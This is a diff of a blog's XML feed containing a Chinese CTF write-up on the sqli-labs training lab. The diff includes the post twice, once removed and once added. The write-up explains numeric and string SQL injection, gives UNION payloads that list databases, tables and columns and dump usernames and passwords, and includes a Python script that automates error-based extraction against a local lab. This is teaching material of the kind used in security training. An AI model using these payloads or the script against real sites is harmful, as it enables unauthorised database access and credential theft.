-<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
-<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
-<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
-<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
-<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
-<p>例如数字型语句：select * from table where id =3</p>
-<p>则字符型如下：select * from table where name=’admin’</p>
-<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号：select * from table where name=’admin’’</p>
-<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
-<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
-<p>Mysql 有三种常用注释符：</p>
-<p>– 注意，这种注释符后边有一个空格</p>
-<p># 通过#进行注释 即**%23**</p>
-<p>/* */ 注释掉符号内的内容</p>
-<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
-<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
-<p><code>?id=1 order by 3--+</code></p>
-<p>查看所有的数据库：</p>
-<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
-<p>查看所有的表：</p>
-<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
-<p>查看所有的字段：</p>
-<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
-<p>查看所有用户名和密码：</p>
-<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
-<p>（0x7e相当于’~’）</p>
-<blockquote>
-<p><strong>concat()函数</strong></p>
-<p>功能：将多个字符串连接成一个字符串。</p>
-<p>语法：concat(str1, str2,…)</p>
-<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
-<p>举例：</p>
-<p>select concat (id, name, score) as info from tt2;</p>
-<p><strong>concat_ws()函数</strong></p>
-<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
-<p>语法：concat_ws(separator, str1, str2, …)</p>
-<p><strong>group_concat()函数</strong></p>
-<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
-<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
-<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
-</blockquote>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
-
-<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
-
-<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
-<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
-
-<p><strong>构造id=-1’)</strong></p>
-<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
-<blockquote>
-<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
-</blockquote>
-<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
-$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
-</code></pre>
-<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-$id=1;
-$id = '"' . $id . '"';
-echo($id);            //"1"
-</code></pre>
-<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
-<p>构造**?id=-1”)** </p>
-<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
-<pre><code class="line-numbers language-python">import requests
-from bs4 import BeautifulSoup
-db_name = ''
-table_list = []
-column_list = []
-url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
-### 获取当前数据库名 ###
-print('当前数据库名:')
-payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
-r = requests.get(url+payload)
-db_name = r.text.split(':')[-2]
-print('[+]' + db_name)
-### 获取表名 ###
-print('数据库%s下的表名:' % db_name)
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
-    r = requests.get(url+payload)
-    if 'group_key' not in r.text:
-        break
-    table_name = r.text.split(':')[-2]
-    table_list.append(table_name)
-    print('[+]' + table_name)
-### 获取列名 ###
-#### 这里以users表为例 ####
-print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    column_name = r.text.split(':')[-2]
-    column_list.append(column_name)
-    print('[+]' + column_name)
-### 获取字段值 ###
-#### 这里以username列为例 ####
-print('%s列下的字段值:' % column_list[-2])
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    dump = r.text.split(':')[-2]
-    print('[+]' + dump)
-</code></pre>
-<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1007,6 +912,154 @@ if (isset($a) &amp;&amp; !is_numeric($a) &amp;&amp; $a == 114514) {
       </categories>
       <tags>
         <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs-master 刷题记录</title>
+    <url>/2020/10/18/sqlilab/</url>
+    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
+<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
+<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
+<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
+<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
+<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
+<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>例如数字型语句：select * from table where id =3</p>
+<p>则字符型如下：select * from table where name=’admin’</p>
+<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号：select * from table where name=’admin’’</p>
+<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
+<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
+<p>Mysql 有三种常用注释符：</p>
+<p>– 注意，这种注释符后边有一个空格</p>
+<p># 通过#进行注释 即**%23**</p>
+<p>/* */ 注释掉符号内的内容</p>
+<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
+<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
+<p><code>?id=1 order by 3--+</code></p>
+<p>查看所有的数据库：</p>
+<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
+<p>查看所有的表：</p>
+<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
+<p>查看所有的字段：</p>
+<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
+<p>查看所有用户名和密码：</p>
+<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
+<p>（0x7e相当于’~’）</p>
+<blockquote>
+<p><strong>concat()函数</strong></p>
+<p>功能：将多个字符串连接成一个字符串。</p>
+<p>语法：concat(str1, str2,…)</p>
+<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p>举例：</p>
+<p>select concat (id, name, score) as info from tt2;</p>
+<p><strong>concat_ws()函数</strong></p>
+<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
+<p>语法：concat_ws(separator, str1, str2, …)</p>
+<p><strong>group_concat()函数</strong></p>
+<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
+<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
+</blockquote>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
+
+<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
+
+<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
+<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
+
+<p><strong>构造id=-1’)</strong></p>
+<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
+<blockquote>
+<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
+</blockquote>
+<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
+$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+</code></pre>
+<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+$id=1;
+$id = '"' . $id . '"';
+echo($id);            //"1"
+</code></pre>
+<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
+<p>构造**?id=-1”)** </p>
+<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
+<pre><code class="line-numbers language-python">import requests
+from bs4 import BeautifulSoup
+db_name = ''
+table_list = []
+column_list = []
+url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
+### 获取当前数据库名 ###
+print('当前数据库名:')
+payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
+r = requests.get(url+payload)
+db_name = r.text.split(':')[-2]
+print('[+]' + db_name)
+### 获取表名 ###
+print('数据库%s下的表名:' % db_name)
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
+    r = requests.get(url+payload)
+    if 'group_key' not in r.text:
+        break
+    table_name = r.text.split(':')[-2]
+    table_list.append(table_name)
+    print('[+]' + table_name)
+### 获取列名 ###
+#### 这里以users表为例 ####
+print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    column_name = r.text.split(':')[-2]
+    column_list.append(column_name)
+    print('[+]' + column_name)
+### 获取字段值 ###
+#### 这里以username列为例 ####
+print('%s列下的字段值:' % column_list[-2])
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    dump = r.text.split(':')[-2]
+    print('[+]' + dump)
+</code></pre>
+<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
